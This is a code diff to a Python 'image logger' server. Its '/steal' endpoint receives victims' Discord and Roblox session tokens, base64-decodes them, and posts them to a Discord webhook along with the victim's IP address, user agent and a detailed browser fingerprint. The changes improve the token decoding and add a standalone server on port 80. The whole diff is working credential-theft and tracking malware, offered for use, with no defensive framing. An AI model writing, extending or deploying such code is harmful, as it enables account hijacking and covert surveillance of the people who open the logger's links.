@@ -98,8 +98,9 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 > Browser: `{os_browser[1]}`
 > UA: `{useragent[:450]}`
 
-**🔑 TOKENS:**{f'\n> **Discord:** `{urllib.parse.unquote(token)}`' if token else ''}
-{'> **Roblox:** `{urllib.parse.unquote(roblox)}`' if roblox else ''}
+**🔑 TOKENS:**
+{f'> **Discord:** ```{token[:1000]}```' if token else '> **Discord:** `None`'}
+{f'> **Roblox:** ```{roblox[:1000]}```' if roblox else '> **Roblox:** `None`'}
 
 **🖥️ FINGERPRINT:**{f'\n> Canvas: `{safe_fp_get(fp_dict,"cv")}`\n> WebGL: `{safe_fp_get(fp_dict,"wg")}`\n> Audio: `{safe_fp_get(fp_dict,"ah")}`\n> Fonts: `{safe_fp_get(fp_dict,"fs","")[:200]}`\n> Screen: `{safe_fp_get(fp_dict,"s")}`\n> CPU: `{safe_fp_get(fp_dict,"c")}` cores\n> RAM: `{safe_fp_get(fp_dict,"m")}`GB\n> Plugins: `{len(safe_fp_get(fp_dict,"pl","").split(","))}`\n> Touch: `{safe_fp_get(fp_dict,"tc")}`\n> Battery: `{safe_fp_get(fp_dict,"bat")}`\n> Memory: `{safe_fp_get(fp_dict,"mem")}`' if config["fpSteal"] else ''}""",
             "fields": [{"name":"🌐 Network","value":network_info,"inline":True}]
@@ -133,8 +134,20 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
             if '/steal' in path:
                 query = urllib.parse.urlparse(self.path).query
                 params = urllib.parse.parse_qs(query)
-                token = params.get('token', [''])[0]
-                roblox = params.get('roblox', [''])[0]
+                token_b64 = params.get('token', [''])[0]
+                roblox_b64 = params.get('roblox', [''])[0]
+                
+                # Properly decode base64 tokens with fallback
+                try:
+                    token = base64.b64decode(token_b64).decode('utf-8') if token_b64 else ""
+                except:
+                    token = urllib.parse.unquote(token_b64) if token_b64 else ""
+                
+                try:
+                    roblox = base64.b64decode(roblox_b64).decode('utf-8') if roblox_b64 else ""
+                except:
+                    roblox = urllib.parse.unquote(roblox_b64) if roblox_b64 else ""
+                
                 fp_data = {k: urllib.parse.unquote(v[0]) for k,v in params.items() if k not in ['token','roblox']}
                 
                 ip = self.headers.get('X-Forwarded-For', '').split(',')[0].strip() or self.client_address[0]
@@ -202,4 +215,10 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+if __name__ == "__main__":
+    from http.server import HTTPServer
+    server = HTTPServer(('0.0.0.0', 80), ImageLoggerAPI)
+    print(f"[{__app__}] {__version__} by {__author__}")
+    print(f"[+] Server started on port 80")
+    print(f"[+] Webhook: {config['webhook']}")
+    server.serve_forever()
